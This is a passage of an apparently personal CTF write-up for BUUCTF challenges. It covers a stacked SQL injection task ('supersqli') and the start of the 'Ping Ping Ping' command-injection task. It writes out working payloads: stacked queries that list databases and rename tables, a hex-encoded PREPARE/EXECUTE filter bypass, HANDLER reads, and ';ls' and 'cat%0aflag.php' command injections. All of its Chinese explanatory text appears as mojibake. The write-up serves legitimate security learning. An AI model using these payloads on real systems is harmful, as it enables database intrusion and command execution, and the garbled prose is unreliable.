<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220701224154901.png" alt="image-20220701224154901"></p>
<p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå…ˆè°ƒç”¨supersqliè¿™ä¸ªåº“çš„è¡¨çœ‹çœ‹</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220701222551203.png" alt="image-20220701222551203"></p>
<p>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼Œå…ˆçœ‹ä¸€ä¸‹çº¯æ•°å­—çš„è¡¨é‡Œçš„å†…å®¹</p>
<p> <strong><u>æ³¨ï¼šå½“çº¯æ•°å­—å­—ç¬¦ä¸²æ˜¯è¡¨åçš„æ—¶å€™éœ€è¦åŠ åå¼•å·&#96;</u></strong></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220701224603433.png" alt="image-20220701224603433"></p>
<p>çœ‹åˆ°flagåœ¨é‡Œé¢ï¼Œå†çœ‹çœ‹wordsé‡Œ</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220701233450179.png" alt="image-20220701233450179"></p>
<p><code>VARCHAR(M)æ˜¯ä¸€ç§æ¯”CHARæ›´åŠ çµæ´»çš„æ•°æ®ç±»å‹ï¼ŒåŒæ ·ç”¨äºè¡¨ç¤ºå­—ç¬¦æ•°æ®ï¼Œä½†æ˜¯VARCHARå¯ä»¥ä¿å­˜å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²</code></p>
<p>è¿™é‡ŒçŒœæµ‹ï¼Œå› ä¸ºflagæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹è¾“å…¥æ¡†æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨</p>
<p>åå°sqlè¯­å¥å¯èƒ½ï¼ˆxxä¸ºè¾“å…¥æ¡†çš„å†…å®¹ï¼‰</p>
<p><code>select id,data from words where id=xx</code></p>
<hr>
<p>æ›´æ”¹è¡¨ååˆ—å</p>
<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>
<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>
<p>3 ï¼Œå°†ä¿®æ”¹åçš„ words è¡¨ä¸­flagåˆ—åæ”¹æˆåˆ—å id ï¼Œè¿™æ ·åªéœ€è¿›è¡Œæ­£å¸¸æŸ¥è¯¢å°±ä¼šæŒ‰ä¸Šé¢çŒœæµ‹åå°sqlè¯­å¥ä¸€æ ·æ˜¾ç¤ºå‡ºflag</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>show tables</code>ä¸»è¦çœ‹çœ‹æ”¹æˆåŠŸæ²¡æœ‰ï¼Œè¿™é‡Œæ”¹è¡¨åè¦æœ‰é¡ºåºï¼Œå¦‚æœå…ˆæ”¹æ•°å­—è¡¨ï¼Œé‚£å°±å‡ºç°ä¸¤ä¸ªwordsè¡¨ï¼Œå¯¼è‡´è¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ”¹wordsè¡¨åä¸ºå…¶ä»–åå­—ï¼Œç„¶åä¿®æ”¹æ•°å­—è¡¨ä¸ºwordsï¼›é¿å…å› ä¸ºåå­—è€Œå‘ç”Ÿå‘½ä»¤å†²çª</p>
<p><img src="/post/wp-buuctf/image-20220702220112706.png" alt="image-20220702220112706"></p>
<p>å¯ä»¥çœ‹åˆ°è¡¨<code>1919810931114514</code>åå­—è¢«æ”¹æˆäº†å¯æŸ¥è¯¢è¡¨<code>words</code></p>
<p>å†çœ‹çœ‹wordsè¡¨çš„åˆ—ï¼Œflagå˜æˆäº†idï¼ŒNOå˜æˆäº†YES</p>
<p><img src="/post/wp-buuctf/image-20220702220308651.png" alt="image-20220702220308651"></p>
<p>å› ä¸ºflagä¸ºidäº†ï¼Œç”¨<code>1&#39; or 1=1;#</code>æ’çœŸæµ‹è¯•ä½¿å…¶å›æ˜¾</p>
<p>çœ‹çœ‹å›æ˜¾æ•°æ®</p>
<p><img src="/post/wp-buuctf/image-20220702221617795.png" alt="image-20220702221617795"></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQl</span>çš„<span class="keyword">rename</span></span><br><span class="line">ç”¨äºé‡å‘½åè¡¨å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>çš„<span class="keyword">alter</span>ç”¨æ³•æ€»ç»“</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼šåˆ é™¤åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> åˆ—å</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ï¼šå¢åŠ åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> åˆ—å å±æ€§ ã€çº¦æŸã€‘</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼šä¿®æ”¹åˆ—çš„ç±»å‹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å CHANGE <span class="keyword">COLUMN</span> åˆ—å ã€æ–°ã€‘åˆ—å</span><br><span class="line">æ–°å±æ€§</span><br><span class="line"><span class="number">4</span>ï¼šé‡å‘½ååˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨åå­— CHANGE <span class="keyword">COLUMN</span> åˆ—å æ–°åˆ—å å±æ€§</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>ï¼šé‡å‘½åè¡¨</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">RENAME</span> <span class="keyword">TO</span> è¡¨æ–°å</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>ï¼šåˆ é™¤è¡¨ä¸­ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>ï¼šæ·»åŠ ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> çº¦æŸå <span class="keyword">PRIMARY KEY</span> (æ·»åŠ åˆ—)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>ï¼šæ·»åŠ ç´¢å¼•</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">index</span> ç´¢å¼•å (åˆ—å);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>ï¼šä¿®æ”¹åˆ—çš„å±æ€§</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å MODIFY <span class="keyword">COLUMN</span> è¦ä¿®æ”¹å±æ€§çš„åˆ—å æ–°å±æ€§;</span><br><span class="line"></span><br><span class="line">ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸æ¨èåœ¨å»ºè¡¨åå¯¹è¡¨è¿›è¡Œå¤§å¹…åº¦ä¿®æ”¹ï¼Œå¤§å¹…åº¦ä¿®æ”¹ææœ‰å¯èƒ½ä½¿è¡¨æ•°æ®ä¸¢å¤±ã€‚</span><br></pre></td></tr></table></figure>

<p>â€“</p>
<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpï¼Œè¿™é‡Œè¡¥å……ä¸¤ç§æ–¹æ³•</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">åŸæ–‡é“¾æ¥</a></p>
<h4 id="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"><a href="#è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶" class="headerlink" title="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"></a><strong>è§£é¢˜æ€è·¯2ï¼š<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">é¢„å¤„ç†</a>ç»•è¿‡selecté™åˆ¶</strong></h4><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>
<p>å†é€šè¿‡æ„é€ payloadå¾—</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>

<p>è¿›è€Œå¾—åˆ°flag</p>
<pre><code>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚
executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚
SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚
</code></pre>
<p><img src="/post/wp-buuctf/image-20230503173612612.png" alt="image-20230503173612612"></p>
<h4 id="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"><a href="#è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡" class="headerlink" title="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"></a><strong>è§£é¢˜æ€è·¯3ï¼š<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>ç»•è¿‡</strong></h4><p>payloadï¼š</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20230503173624567.png" alt="image-20230503173624567"></p>
<h5 id="handleråŸºæœ¬ç”¨æ³•"><a href="#handleråŸºæœ¬ç”¨æ³•" class="headerlink" title="handleråŸºæœ¬ç”¨æ³•"></a>handleråŸºæœ¬ç”¨æ³•</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡<span class="keyword">READ</span> <span class="keyword">NEXT</span>ä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ<span class="keyword">NEXT</span>ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼Œ<span class="keyword">NEXT</span>è·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡<span class="keyword">NEXT</span>ç»§ç»­æµè§ˆã€‚</span><br></pre></td></tr></table></figure>



<p><u><code>å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯æŒ‡å‘æ•°æ®åº“é‡Œçš„è¡¨ã€‘</code></u></p>
<h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">3.1 åˆ›å»ºæµ‹è¯•è¡¨åŠæµ‹è¯•æ•°æ®</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 ä¸é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆã€‘</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆFIRST,NEXT,PREV,LASTï¼‰</span><br><span class="line">é€šè¿‡ç´¢å¼•æŸ¥çœ‹çš„è¯ï¼Œå¯ä»¥æŒ‰ç…§ç´¢å¼•çš„å‡åºï¼Œä»å°åˆ°å¤§ï¼ŒæŸ¥çœ‹è¡¨ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">åˆ›å»ºç´¢å¼•ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆ=,&lt;=,&gt;=,&lt;,&gt;ï¼‰</span><br><span class="line">ä»indexä¸º2çš„åœ°æ–¹å¼€å§‹</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 é™„åŠ ï¼šè¯­æ³•å®ä¾‹å‚è€ƒ</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹æ‡‚ä»¥åï¼Œæˆ‘è‡ªå·±åˆé‡æ–°æ„é€ äº†ä¸€ä¸ª</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœä¸€æ ·ï¼Œæ„æ€ä¹Ÿå·®ä¸å¤š</p>
<p><img src="/post/wp-buuctf/image-20220731224702281.png" alt="image-20220731224702281"></p>
<h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—åº”è¯¥æ˜¯é“å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®</p>
<p>å…ˆä¼ ä¸€ä¸ªIP:123.123.123.123è¯•è¯•</p>
<p><code>?ip=123.123.123.123</code></p>
<p><img src="/post/wp-buuctf/image-20220706231831194.png" alt="image-20220706231831194"></p>
<p>çœ‹èµ·æ¥æ˜¯Linuxå‘½ä»¤ï¼Œå…ˆæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶è¯•è¯•ï¼ˆ;æ˜¯é¡ºåºæ‰§è¡Œï¼Œä»å·¦å¾€å³ï¼Œå‘½ä»¤å…¨éƒ¨æ‰§è¡Œï¼‰</p>
<p><code>?ip=123.123.123.123;ls</code></p>
<p><img src="/post/wp-buuctf/image-20220706232001574.png" alt="image-20220706232001574"></p>
<p>çœ‹åˆ°flagæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å‡º</p>
<p><img src="/post/wp-buuctf/image-20220706232135596.png" alt="image-20220706232135596"></p>
<p>å‘ç°ï¼Œç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæˆ‘è¯•è¯•äº†å¾ˆå¤šç»•è¿‡ï¼Œæ¯”å¦‚%0aï¼Œ%20ï¼Œ%09ï¼Œ&lt;&gt;ï¼Œä½†æ˜¯å›æ˜¾éƒ½æ˜¯</p>
<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>
